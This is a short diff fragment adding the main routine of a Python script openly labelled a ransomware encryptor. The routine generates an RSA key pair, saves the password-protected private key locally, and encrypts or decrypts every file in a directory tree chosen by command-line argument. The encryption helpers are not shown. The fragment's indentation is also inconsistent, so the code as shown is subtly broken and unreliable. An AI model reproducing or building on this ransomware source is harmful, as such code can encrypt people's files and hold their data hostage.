@@ -205,3 +205,19 @@ if __name__ == "__main__":
 	print("> Ransomware encryptor starting...")
 
 	password = digestSHA256((sys.argv[3]).encode()) # password digest
+
+priv_key, pub_key = newRSAKeyPair();
+
+	if(sys.argv[2] == 'e'):
+		storeKeyPEM(priv_key, password, path=os.getcwd()) # store private key in cwd
+		cnt_files = encryptDirectoryTree(sys.argv[1],pub_key)
+		print("Encrypted {} file(s) [{}\{}] in directory {}".format(cnt_files[1],cnt_files[1],cnt_files[0],sys.argv[1]))
+	elif(sys.argv[2] == 'd'):
+		p_key = loadKeyPEM(password, path=os.getcwd())
+		cnt_files = decryptDirectoryTree(sys.argv[1],p_key)
+		print("Decrypted {} file(s) [{}\{}] in directory {}".format(cnt_files[1],cnt_files[1],cnt_files[0],sys.argv[1]))
+	else:
+		print("Usage: ransomware.py <dir> <e|d> <password>")
+		sys.exit(1)
+
+	print("Total time of execution : {} ".format(datetime.timedelta(seconds=time.time()-start_time)))
